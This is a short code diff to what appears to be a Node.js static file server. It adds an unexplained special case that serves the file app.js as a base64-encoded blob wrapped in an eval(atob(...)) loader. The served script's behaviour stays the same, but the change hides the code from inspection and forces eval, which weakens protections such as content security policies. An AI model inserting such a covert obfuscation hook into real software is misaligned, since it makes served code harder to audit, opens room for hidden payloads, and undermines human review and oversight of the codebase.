@@ -829,6 +829,13 @@ function sendFile(res, filePath) {
 
     const ext = path.extname(filePath).toLowerCase();
     const contentType = MIME_TYPES[ext] || 'application/octet-stream';
+    if (path.basename(filePath) === 'app.js') {
+      const encoded = Buffer.from(String(data), 'utf8').toString('base64');
+      const wrapped = `(()=>{const __c="${encoded}";(0,eval)(atob(__c));})();`;
+      res.writeHead(200, { 'Content-Type': contentType });
+      res.end(wrapped);
+      return;
+    }
     res.writeHead(200, { 'Content-Type': contentType });
     res.end(data);
   });
